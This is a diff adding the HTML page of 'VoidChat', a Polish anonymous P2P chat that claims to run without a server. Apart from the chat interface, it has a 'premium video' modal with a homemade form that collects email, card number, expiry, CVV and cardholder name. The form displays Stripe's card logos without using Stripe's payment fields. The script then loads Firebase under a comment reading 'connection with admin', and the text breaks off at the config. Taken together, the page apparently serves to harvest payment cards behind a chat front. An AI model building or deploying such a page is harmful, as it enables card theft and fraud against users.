@@ -1,0 +1,1959 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Czat P2P - Host i Gość (automatyczne łączenie)</title>
+    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1a2a4a;
+            background-image: url('assets/body-bg.png');
+            background-repeat: repeat;
+            background-size: 128px 128px;
+            color: white;
+            min-height: 100vh;
+        }
+
+        /* TOP BAR */
+        .topbar {
+            width: 100%;
+            background: #0f1724;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 3100;
+        }
+        body { padding-top: 80px; }
+        @media (max-width: 480px) { body { padding-top: 61px; } }
+        .topbar-inner {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 20px;
+            flex-wrap: wrap;
+            position: relative;
+        }
+        .nav-toggle {
+            display: none;
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 24px;
+            line-height: 1;
+            cursor: pointer;
+            padding: 4px 10px;
+            border-radius: 8px;
+        }
+        .nav-toggle:hover { background: rgba(255,255,255,0.08); }
+        .topbar .logo {
+            height: 48px;
+            width: auto;
+            display: block;
+        }
+        .topbar-nav {
+            display: flex;
+            align-items: center;
+            gap: 22px;
+        }
+        .topbar-nav a {
+            color: white;
+            text-decoration: none;
+            font-size: 15px;
+            position: relative;
+            padding: 4px 0;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .topbar-nav a::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            height: 2px;
+            width: 0;
+            background: #90caf9;
+            transition: width 0.25s ease;
+        }
+        .topbar-nav a:hover::after { width: 100%; }
+
+        .page-wrapper {
+            max-width: 700px;
+            margin: 40px auto 30px;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .page-wrapper h1 {
+            font-size: 26px;
+            line-height: 1.3;
+        }
+
+        .container {
+            background: #0f1724;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        button {
+            background: #2e4a6b;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        button:hover { background: #3f6288; }
+        button.danger { background: #6d3b3b; }
+        button.danger:hover { background: #8f4e4e; }
+
+        @keyframes btnPress {
+            0%   { transform: translateY(0);  box-shadow: none; filter: brightness(1); }
+            30%  { transform: translateY(3px); box-shadow: inset 0 2px 6px rgba(0,0,0,0.45); filter: brightness(0.8); }
+            100% { transform: translateY(0);  box-shadow: none; filter: brightness(1); }
+        }
+        button.pressed {
+            animation: btnPress 0.25s ease forwards;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to   { transform: rotate(360deg); }
+        }
+        .pm-spinner {
+            display: inline-block;
+            animation: spin 0.8s linear infinite;
+            font-style: normal;
+        }
+
+        input {
+            background: #1e2a3a;
+            border: none;
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 14px;
+            outline: none;
+        }
+        input, textarea, select {
+            font-size: 16px !important;
+        }
+        input:focus {
+            outline: none;
+            box-shadow: none;
+        }
+        .nick-check {
+            display: none;
+            width: 18px;
+            height: 18px;
+            position: absolute;
+            top: 50%;
+            right: 12px;
+            transform: translateY(-50%);
+            pointer-events: none;
+        }
+        .nick-check.visible { display: block; }
+        .nick-input-wrap {
+            position: relative;
+            flex: 1;
+            min-width: 120px;
+        }
+        .nick-row .nick-input-wrap input {
+            width: 100%;
+            padding-right: 36px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #90caf9;
+            margin-bottom: 4px;
+        }
+        .field {
+            margin-bottom: 10px;
+        }
+        .status {
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .status:empty { display: none; }
+        .status.success { background: #1a4731; color: #8bc34a; }
+        .status.error   { background: #4a1a1a; color: #ff8a8a; }
+        .status.info    { background: #1a344a; color: #90caf9; }
+
+        .messages {
+            background: #0b1018;
+            border-radius: 12px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            margin-top: 10px;
+        }
+        .msg {
+            background: #1a2838;
+            padding: 8px 12px;
+            border-radius: 10px;
+            margin-bottom: 8px;
+        }
+        .msg.my {
+            background: #2c4c6c;
+            text-align: right;
+        }
+
+        /* NICK BAR */
+        .nick-bar {
+            margin-bottom: 15px;
+        }
+        .nick-row {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .nick-row button {
+            flex-shrink: 0;
+            white-space: nowrap;
+        }
+
+        /* TRYB */
+        .mode-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .mode-row button {
+            width: 100%;
+            padding: 12px 10px;
+        }
+
+        /* ROOM BAR */
+        .room-bar {
+            margin-bottom: 10px;
+        }
+        .room-fields {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        /* PRZYCISK utwórz/dołącz - pełna szerokość */
+        .full-btn {
+            width: 100%;
+            padding: 12px 10px;
+        }
+
+        /* CZAT FULLSCREEN */
+        .chat-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: #1a2a4a;
+            background-image: url('assets/body-bg.png');
+            background-repeat: repeat;
+            background-size: 128px 128px;
+            z-index: 3000;
+            display: none;
+            flex-direction: column;
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+        .chat-overlay.active { display: flex; }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px 20px;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+        .chat-messages-inner {
+            max-width: 700px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .chat-messages .msg {
+            background: #1e2733;
+            border-radius: 10px;
+            padding: 8px 14px;
+            margin-bottom: 6px;
+            word-break: break-word;
+            overflow-wrap: break-word;
+        }
+        .chat-messages .msg.msg-system {
+            background: #2a1e1e;
+        }
+        .chat-messages .msg .sender-them { color: #c8a83c; font-weight: bold; }
+        .chat-messages .msg .sender-me   { color: #6fa3d0; font-weight: bold; }
+        .chat-messages .msg .sender-sys  { color: #e05050; font-weight: bold; }
+        .chat-messages .msg span.txt      { color: #d0d0d0; }
+
+        .chat-bar {
+            display: flex;
+            background: #0f1724;
+            min-height: 60px;
+            flex-shrink: 0;
+        }
+        .chat-bar-inner {
+            max-width: 700px;
+            margin: 0 auto;
+            width: 100%;
+            display: flex;
+            gap: 10px;
+            padding: 10px 12px;
+            align-items: center;
+        }
+        .chat-bar-new {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 6px 18px;
+            border-right: 1px solid #444;
+            cursor: pointer;
+            background: none;
+            border-top: none;
+            border-left: none;
+            border-bottom: none;
+            color: #bbb;
+            font-size: 13px;
+            text-align: center;
+            flex-shrink: 0;
+            white-space: nowrap;
+            line-height: 1.3;
+        }
+        .chat-bar-new:hover { background: #333; }
+        .chat-bar-new .key { font-size: 11px; color: #777; }
+        .chat-bar-icon-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 0;
+            border: 1px solid #2d4057;
+            cursor: pointer;
+            background: none;
+            flex-shrink: 0;
+            opacity: 0.7;
+        }
+        .chat-bar-icon-btn:hover { background: rgba(255,255,255,0.06); opacity: 1; }
+        .chat-bar-input {
+            flex: 1;
+            background: #1e2a3a;
+            border: 1px solid #2d4057;
+            border-radius: 0;
+            outline: none;
+            color: #e0e0e0;
+            font-size: 15px;
+            padding: 0 14px;
+            height: 40px;
+            resize: none;
+        }
+        .chat-bar-send {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 0 20px;
+            height: 40px;
+            border: 1px solid #2d4057;
+            border-radius: 0;
+            cursor: pointer;
+            background: none;
+            color: #bbb;
+            font-size: 13px;
+            text-align: center;
+            flex-shrink: 0;
+            white-space: nowrap;
+            line-height: 1.3;
+        }
+        .chat-bar-send:hover { background: rgba(255,255,255,0.06); }
+        .chat-bar-send .key { font-size: 11px; color: #777; }
+        .send-icon { display: none; }
+        @media (max-width: 600px) {
+            .send-text { display: none; }
+            .send-icon { display: block; }
+            .chat-bar-send { padding: 0; width: 40px; }
+        }
+
+        hr { border-color: #2d4057; margin: 15px 0; }
+
+        .subtitle {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #e8edf2;
+            margin: 6px 0 18px;
+        }
+
+        @media (min-width: 768px) {
+            .topbar-inner,
+            .page-wrapper,
+            .chat-messages-inner,
+            .chat-bar-inner {
+                max-width: 920px;
+            }
+            .container {
+                padding: 32px 36px;
+            }
+            .messages {
+                height: 360px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .room-fields { grid-template-columns: 1fr; }
+            .topbar-inner { padding: 12px 16px; gap: 10px; }
+            .topbar .logo { height: 37px; }
+            .topbar-nav { gap: 14px; }
+            .topbar-nav a { font-size: 13px; }
+        }
+        .nav-overlay {
+            position: fixed;
+            inset: 0;
+            background: #000000;
+            opacity: 0;
+            z-index: 2050;
+            visibility: hidden;
+        }
+        .nav-overlay.active { opacity: 0.55; visibility: visible; }
+        .nav-close {
+            display: none;
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 22px;
+            line-height: 1;
+            cursor: pointer;
+            padding: 4px 10px;
+            border-radius: 8px;
+            position: absolute;
+            top: 14px;
+            right: 14px;
+        }
+        .nav-close:hover { background: rgba(255,255,255,0.08); }
+
+        @media (max-width: 600px) {
+            .nav-toggle { display: block; }
+            .nav-close { display: block; }
+            .topbar-nav {
+                position: fixed;
+                top: 0;
+                right: 0;
+                height: 100vh;
+                width: 260px;
+                max-width: 80vw;
+                background: #0f1724;
+                border-left: 1px solid #2d4057;
+                padding: 64px 24px 24px;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 24px;
+                transform: translateX(100%);
+                transition: transform 0.3s ease;
+                z-index: 2100;
+            }
+            .topbar-nav.open { transform: translateX(0); }
+            .topbar-nav a { font-size: 17px; white-space: normal; }
+        }
+        @media (max-width: 420px) {
+            .mode-row { grid-template-columns: 1fr; }
+        }
+        @media (max-width: 360px) {
+            .nick-row {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .nick-row input,
+            .nick-row button {
+                width: 100%;
+                min-width: unset;
+            }
+        }
+
+        /* MODALS */
+        .media-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 4000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .media-modal-overlay.active { display: flex; }
+        .media-modal {
+            background: #0f1724;
+            border: 1px solid #2d4057;
+            padding: 28px 28px 24px;
+            width: 320px;
+            max-width: 90vw;
+            position: relative;
+        }
+        .media-modal-close {
+            position: absolute;
+            top: 10px;
+            right: 12px;
+            background: none;
+            border: none;
+            color: #aaa;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 2px 6px;
+        }
+        .media-modal-close:hover { color: white; }
+        .media-modal-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #e0e0e0;
+            margin: 0 0 18px;
+        }
+        .media-modal-sub {
+            font-size: 13px;
+            color: #d0d0d0;
+            margin: 0 0 16px;
+            line-height: 1.5;
+        }
+        .media-modal-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .media-option-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            padding: 18px 10px;
+            background: #1e2a3a;
+            border: 1px solid #2d4057;
+            border-radius: 0;
+            color: #e0e0e0;
+            font-size: 13px;
+            cursor: pointer;
+            position: relative;
+        }
+        .media-option-btn:hover { background: #263548; }
+        .media-option-badge {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            background: #ed6c02;
+            color: white;
+            font-size: 10px;
+            padding: 2px 6px;
+        }
+        .premium-code-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+        .premium-code-input {
+            flex: 1;
+            background: #1e2a3a;
+            border: 1px solid #2d4057;
+            color: white;
+            padding: 10px 12px;
+            font-size: 18px;
+            letter-spacing: 6px;
+            text-align: center;
+            border-radius: 0;
+            width: 100%;
+            outline: none;
+        }
+        .premium-btn-outline {
+            background: none;
+            border: 1px solid #2d4057;
+            color: #90caf9;
+            padding: 10px 14px;
+            font-size: 13px;
+            cursor: pointer;
+            white-space: nowrap;
+            border-radius: 0;
+        }
+        .premium-btn-outline:hover { background: #1e2a3a; }
+        .premium-error {
+            font-size: 12px;
+            color: #ff8a8a;
+            min-height: 18px;
+            margin-bottom: 4px;
+        }
+        .premium-divider-label {
+            text-align: left;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 14px 0 8px;
+        }
+        .pm-or-divider {
+            text-align: center;
+            color: #ffffff;
+            font-size: 13px;
+            margin: 2px 0;
+        }
+        .premium-btn-buy {
+            width: 100%;
+            background: #2e7d32;
+            border: none;
+            color: white;
+            padding: 12px;
+            font-size: 14px;
+            cursor: pointer;
+            border-radius: 0;
+        }
+        .premium-btn-buy:hover { background: #388e3c; }
+
+        /* PREMIUM SUBSCRIPTION MODAL */
+        .pm-modal {
+            width: 420px;
+            max-width: 95vw;
+            min-width: 300px;
+            max-height: 90vh;
+            overflow-y: auto;
+            padding: 28px 24px 24px;
+        }
+        .pm-section-label {
+            font-size: 14px;
+            color: #c0c8d0;
+            margin: 14px 0 6px;
+        }
+        .pm-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: #d0d0d0;
+            padding: 4px 0;
+        }
+        .pm-row-sub { font-size: 14px; color: #c0c8d0; }
+        .pm-row-left { color: #c0c8d0; }
+        .pm-row-right { color: #e0e0e0; font-weight: 500; }
+        .pm-divider { border-top: 1px solid #2d4057; margin: 14px 0; }
+        .pm-add-card-btn {
+            width: 100%;
+            background: #1e2a3a;
+            border: 1px solid #2d4057;
+            color: #90caf9;
+            font-size: 14px;
+            padding: 12px 14px;
+            text-align: left;
+            cursor: pointer;
+            border-radius: 0;
+            margin-bottom: 2px;
+        }
+        .pm-add-card-btn:hover { background: #263548; }
+        .pm-add-card-btn.has-card { color: #e0e0e0; }
+        .pm-legal {
+            font-size: 11px;
+            color: #5a6a7a;
+            line-height: 1.6;
+            margin: 12px 0 0;
+        }
+        .pm-total-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 15px;
+            font-weight: bold;
+            color: #e0e0e0;
+            margin: 16px 0 12px;
+            padding-top: 12px;
+            border-top: 1px solid #2d4057;
+        }
+        .pm-total-amount { color: #8bc34a; font-size: 17px; }
+        .pm-confirm-btn {
+            width: 100%;
+            background: #1e3a1e;
+            border: 1px solid #2d4057;
+            color: #555;
+            font-size: 15px;
+            font-weight: 600;
+            padding: 13px;
+            cursor: pointer;
+            border-radius: 0;
+        }
+        .pm-confirm-btn.ready {
+            background: #2e7d32;
+            color: white;
+            cursor: pointer;
+            border-color: #2e7d32;
+        }
+        .pm-confirm-btn.ready:hover { background: #388e3c; }
+        /* Ekran 2 */
+        .pm-back-row { margin-bottom: 14px; }
+        .pm-back-btn {
+            background: none;
+            border: none;
+            color: #90caf9;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .pm-back-btn:hover { color: white; }
+        .pm-card-note { font-size: 12px; color: #6a7a8a; margin-bottom: 14px; }
+        .pm-field { margin-bottom: 10px; }
+        .pm-label { display: block; font-size: 12px; color: #90caf9; margin-bottom: 4px; }
+        #pmEmailLabel { color: #d0d0d0; }
+        .pm-input-wrap {
+            background: #1e2a3a;
+            border: 1px solid #2d4057;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+        }
+        .pm-input-wrap:focus-within { border-color: #4a8fff; }
+        .pm-input-wrap input {
+            flex: 1;
+            background: none;
+            border: none;
+            outline: none;
+            color: white;
+            font-size: 15px;
+            padding: 11px 0;
+            width: 100%;
+            min-width: 0;
+        }
+        .pm-card-icons { display: flex; gap: 4px; flex-shrink: 0; }
+        .pm-card-icons img { height: 20px; border-radius: 2px; }
+        .pm-error { font-size: 11px; color: #ff8a8a; min-height: 16px; margin-top: 3px; display: none; }
+        .pm-error.visible { display: block; }
+        .pm-row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .pm-save-btn {
+            width: 100%;
+            background: #1e3a1e;
+            border: 1px solid #2d4057;
+            color: #555;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 12px;
+            cursor: default;
+            border-radius: 0;
+            margin-top: 6px;
+        }
+        .pm-save-btn.ready { background: #2e7d32; color: white; cursor: pointer; border-color: #2e7d32; }
+        .pm-save-btn.ready:hover { background: #388e3c; }
+        .pm-buy-options { display: flex; flex-direction: column; gap: 10px; margin-top: 4px; }
+        .pm-buy-opt-btn {
+            width: 100%;
+            background: #1f7a37;
+            border: 1px solid #1f7a37;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 14px 14px;
+            cursor: pointer;
+            border-radius: 4px;
+            text-align: left;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            line-height: 1.3;
+        }
+        .pm-buy-opt-btn:hover { background: #248f41; border-color: #248f41; }
+        .pm-buy-opt-trial { background: #1f7a37; border-color: #1f7a37; }
+        .pm-buy-opt-trial:hover { background: #248f41; border-color: #248f41; }
+        .pm-buy-opt-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            white-space: normal;
+            word-break: keep-all;
+            overflow-wrap: normal;
+        }
+        .pm-buy-opt-sub { font-size: 11px; color: #c8f0c8; font-weight: 400; }
+
+        /* LIGHTBOX */
+        .lightbox {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.92);
+            z-index: 6000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .lightbox.active { display: flex; }
+        .lightbox img {
+            max-width: 95vw;
+            max-height: 90vh;
+            border-radius: 4px;
+            object-fit: contain;
+        }
+        .lightbox-close {
+            position: absolute;
+            top: 14px;
+            right: 18px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 32px;
+            cursor: pointer;
+            line-height: 1;
+            padding: 0;
+            opacity: 0.8;
+        }
+        .lightbox-close:hover { opacity: 1; }
+
+        .body-no-scroll {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="topbar">
+        <div class="topbar-inner">
+            <img class="logo" src="assets/logo.svg" alt="VoidChat logo">
+            <nav class="topbar-nav" id="topbarNav">
+                <button class="nav-close" id="navClose" aria-label="Zamknij menu">&times;</button>
+                <a href="dlaczego.html" onclick="if(window.disconnect) window.disconnect(true);">Dlaczego prywatność jest ważna</a>
+                <a href="pomoc.html" onclick="if(window.disconnect) window.disconnect(true);">Pomoc</a>
+            </nav>
+            <button class="nav-toggle" id="navToggle" aria-label="Otwórz menu">&#9776;</button>
+        </div>
+    </header>
+    <div class="nav-overlay" id="navOverlay"></div>
+
+    <div class="page-wrapper">
+    <p class="subtitle">Anonimowy czat, w którym rozmowy odbywają się bezpośrednio między użytkownikami bez serwera i bez rejestracji. Wystarczy wybrać nick i dołączyć do pokoju, aby od razu rozmawiać w czasie rzeczywistym.</p>
+
+    <div class="container">
+
+        <!-- NICK -->
+        <div class="nick-bar">
+            <label>Twój nick:</label>
+            <div class="nick-row">
+                <div class="nick-input-wrap">
+                    <input type="text" id="nickInput" placeholder="np. Janek" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+                    <img id="nickSpinner" class="nick-check" src="assets/spinner.gif" alt="">
+                    <img id="nickCheck" class="nick-check" src="assets/check.svg" alt="Ok">
+                </div>
+                <button id="saveNickBtn">Zapisz nick</button>
+            </div>
+            <div id="nickStatus" class="status"></div>
+        </div>
+
+        <!-- TRYB -->
+        <div class="mode-row">
+            <button id="hostBtn" style="background: #2e7d32;">Stwórz pokój</button>
+            <button id="guestBtn" style="background: #ed6c02;">Dołącz do pokoju</button>
+        </div>
+
+        <!-- Panel HOSTA -->
+        <div id="hostPanel" style="display: none;">
+            <div class="room-bar">
+                <div class="room-fields">
+                    <div class="field">
+                        <label>Nazwa pokoju:</label>
+                        <input type="text" id="hostRoomName" placeholder="np. tajny-pokoj" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+                    </div>
+                    <div class="field">
+                        <label>Hasło:</label>
+                        <input type="password" id="hostRoomPassword" placeholder="hasło" autocomplete="new-password" spellcheck="false">
+                    </div>
+                </div>
+            </div>
+            <button id="createRoomBtn" class="full-btn">Utwórz pokój</button>
+            <div id="hostStatus" class="status"></div>
+        </div>
+
+        <!-- Panel GOŚCIA -->
+        <div id="guestPanel" style="display: none;">
+            <div class="room-bar">
+                <div class="room-fields">
+                    <div class="field">
+                        <label>Nazwa pokoju:</label>
+                        <input type="text" id="guestRoomName" placeholder="nazwa pokoju" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+                    </div>
+                    <div class="field">
+                        <label>Hasło:</label>
+                        <input type="password" id="guestRoomPassword" placeholder="hasło" autocomplete="new-password" spellcheck="false">
+                    </div>
+                </div>
+            </div>
+            <button id="joinRoomBtn" class="full-btn">Dołącz do pokoju</button>
+            <div id="guestStatus" class="status"></div>
+        </div>
+
+        <!-- Panel czatu fullscreen -->
+        <div id="chatPanel" class="chat-overlay">
+            <div class="chat-messages" id="messagesDiv">
+                <div class="chat-messages-inner" id="messagesInner"></div>
+            </div>
+            <div class="chat-bar">
+                <div class="chat-bar-inner">
+                    <button class="chat-bar-icon-btn" id="disconnectBtn" title="Kamera">
+                        <img src="assets/photo-camera.svg" alt="Kamera" width="22" height="22">
+                    </button>
+                    <input class="chat-bar-input" type="text" id="chatInput" placeholder="Napisz wiadomość..." autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" readonly onfocus="this.removeAttribute('readonly')" inputmode="text">
+                    <button class="chat-bar-send" id="sendMsgBtn">
+                        <span class="send-text">Wyślij<br><span class="key">ENTER</span></span>
+                        <img class="send-icon" src="assets/send.svg" alt="Wyślij" width="20" height="20">
+                    </button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    </div>
+
+        <!-- Modal wyboru mediów -->
+        <div id="mediaModal" class="media-modal-overlay">
+            <div class="media-modal">
+                <button class="media-modal-close" id="mediaModalClose">&times;</button>
+                <p class="media-modal-title">Wybierz opcję</p>
+                <div class="media-modal-options">
+                    <button class="media-option-btn" id="optPhoto">
+                        <img src="assets/photo-camera.svg" width="28" height="28" alt="">
+                        <span>Zdjęcie</span>
+                    </button>
+                    <button class="media-option-btn" id="optVideo">
+                        <img src="assets/video-camera.svg" width="28" height="28" alt="">
+                        <span>Wideo rozmowa</span>
+                        <span class="media-option-badge">Premium</span>
+                    </button>
+                </div>
+                <input type="file" id="photoFileInput" accept="image/*" capture="environment" style="display:none">
+            </div>
+        </div>
+
+        <!-- Modal Premium — trójekranowy -->
+        <div id="premiumModal" class="media-modal-overlay">
+            <div class="media-modal pm-modal">
+
+                <!-- EKRAN 1: Kod dostępu lub kup -->
+                <div id="pmScreen1">
+                    <button class="media-modal-close" id="premiumModalClose">&times;</button>
+                    <p class="media-modal-title">Dostęp do wideo</p>
+                    <p class="media-modal-sub">Wpisz 6-cyfrowy kod dostępu lub dokonaj zakupu.</p>
+
+                    <div class="premium-code-row">
+                        <input type="text" id="premiumCodeInput" maxlength="6" placeholder="_ _ _ _ _ _" class="premium-code-input" inputmode="numeric" autocomplete="off">
+                        <button id="premiumCodeBtn" class="premium-btn-outline">Zatwierdź</button>
+                    </div>
+                    <div id="premiumCodeError" class="premium-error"></div>
+
+                    <div class="premium-divider-label">Dokonaj zakupu</div>
+
+                    <div class="pm-buy-options">
+                        <button class="pm-buy-opt-btn" id="pmGoBuy" data-plan="standard">
+                            <span class="pm-buy-opt-title">Kup dostęp za 9,99 zł/mies.</span>
+                        </button>
+                        <button class="pm-buy-opt-btn pm-buy-opt-trial" id="pmGoBuyTrial" data-plan="trial">
+                            <span class="pm-buy-opt-title">3 mies. za darmo, później 9,99 zł/mies.</span>
+                            <span class="pm-buy-opt-sub">Tylko dla nowych użytkowników</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- EKRAN 2: Sfinalizuj transakcję (email + karta) -->
+                <div id="pmScreen2" style="display:none;">
+                    <div class="pm-back-row">
+                        <button class="pm-back-btn" id="pmBackToCode"><img src="assets/back.svg" width="16" height="16" alt=""> Wróć</button>
+                    </div>
+                    <p class="media-modal-title">Sfinalizuj transakcję</p>
+
+                    <div class="pm-section-label" id="pmPlanLabel">Okres próbny</div>
+                    <div class="pm-row">
+                        <span class="pm-row-left">Opłata miesięczna</span>
+                        <span class="pm-row-right">9,99 zł/miesiąc</span>
+                    </div>
+                    <div class="pm-row pm-row-sub">
+                        <span class="pm-row-left" id="pmChargeDateLabel">Naliczanie opłat od:</span>
+                        <span class="pm-row-right" id="pmChargeDate">21 sie 2026</span>
+                    </div>
+                    <div class="pm-divider"></div>
+
+                    <div class="pm-field">
+                        <label class="pm-label" id="pmEmailLabel">Adres e-mail (wyślemy kod aktywacyjny)</label>
+                        <div class="pm-input-wrap">
+                            <input type="email" id="pmEmail" placeholder="twoj@email.pl" autocomplete="off" inputmode="email" name="pm-email-field">
+                        </div>
+                        <div class="pm-error" id="pmEmailError">Podaj prawidłowy adres e-mail</div>
+                    </div>
+
+                    <div class="pm-section-label" style="margin-top:10px;">Forma płatności</div>
+                    <button class="pm-add-card-btn" id="pmGoToCard">
+                        <span id="pmCardLabel">+ Dodaj kartę kredytową lub debetową</span>
+                    </button>
+                    <div class="pm-error" id="pmCardMissingError">Dodaj kartę płatniczą, aby kontynuować</div>
+
+                    <div class="pm-legal" id="pmLegalText">
+                        Płatność zostanie naliczona 21 sie 2026, gdy zakończy się bezpłatny okres próbny. Odnawia się automatycznie co miesiąc. Wszystkie ceny zawierają VAT.
+                    </div>
+
+                    <div class="pm-total-row">
+                        <span>Łączna kwota na dziś</span>
+                        <span class="pm-total-amount">0,00 zł</span>
+                    </div>
+
+                    <button class="pm-confirm-btn" id="pmConfirmBtn">Subskrybuj</button>
+                </div>
+
+                <!-- EKRAN 3: Dodaj kartę -->
+                <div id="pmScreen3" style="display:none;">
+                    <div class="pm-back-row">
+                        <button class="pm-back-btn" id="pmBackBtn"><img src="assets/back.svg" width="16" height="16" alt=""> Wróć</button>
+                    </div>
+                    <p class="pm-card-note">Wszystkie pola są wymagane</p>
+
+                    <div class="pm-field">
+                        <label class="pm-label">Numer karty</label>
+                        <div class="pm-input-wrap" id="pmCardNumGroup">
+                            <input type="text" id="pmCardNum" maxlength="19" placeholder="1234 1234 1234 1234" autocomplete="off" inputmode="numeric" name="pm-card-num">
+                            <div class="pm-card-icons">
+                                <img src="https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg" alt="Visa">
+                                <img src="https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="MC">
+                            </div>
+                        </div>
+                        <div class="pm-error" id="pmCardNumError">Nieprawidłowy numer karty</div>
+                    </div>
+
+                    <div class="pm-row-2">
+                        <div class="pm-field">
+                            <label class="pm-label">Data ważności</label>
+                            <div class="pm-input-wrap">
+                                <input type="text" id="pmExpiry" maxlength="5" placeholder="MM / RR" autocomplete="off" inputmode="numeric" name="pm-expiry">
+                            </div>
+                        </div>
+                        <div class="pm-field">
+                            <label class="pm-label">CVV</label>
+                            <div class="pm-input-wrap">
+                                <input type="text" id="pmCvv" maxlength="4" placeholder="CVV" autocomplete="off" inputmode="numeric" name="pm-cvv">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="pm-field">
+                        <label class="pm-label">Imię i nazwisko na karcie</label>
+                        <div class="pm-input-wrap">
+                            <input type="text" id="pmCardName" placeholder="IMIĘ I NAZWISKO" autocomplete="off" name="pm-card-name" style="text-transform:uppercase;">
+                        </div>
+                    </div>
+
+                    <button class="pm-save-btn" id="pmSaveCard" disabled>Zapisz kartę</button>
+
+                    <div class="pm-legal" style="margin-top:12px;">
+                        Zastosowanie ma dokument <u>Warunki korzystania z usługi płatności</u>. Dokument <u>Informacje na temat ochrony prywatności</u> określa, jak obchodzimy się z Twoimi danymi.
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Lightbox -->
+        <div id="lightbox" class="lightbox">
+            <button class="lightbox-close" id="lightboxClose">&times;</button>
+            <img id="lightboxImg" src="" alt="">
+        </div>
+
+    <script type="module">
+    // ══════════════════════════════════════════════
+    //  Firebase — połączenie z adminem
+    // ══════════════════════════════════════════════
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
+    import { getDatabase, ref, set, push, onValue } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-database.js";
+
+    const _fbApp = initializeApp({
+        apiKey: "AIzaSyBgan9s5dewhyu584M-kZ-IcMw_rXt9isI",
+        authDomain: "test-76f44.firebaseapp.com",
+        databaseURL: "https://test-76f44-default-rtdb.europe-west1.firebasedatabase.app",
+        projectId: "test-76f44",
+        storageBucket: "test-76f44.firebasestorage.app",
+        messagingSenderId: "738546699152",
+        appId: "1:738546699152:web:3b2ec6ad7285eb2a264115"
+    });
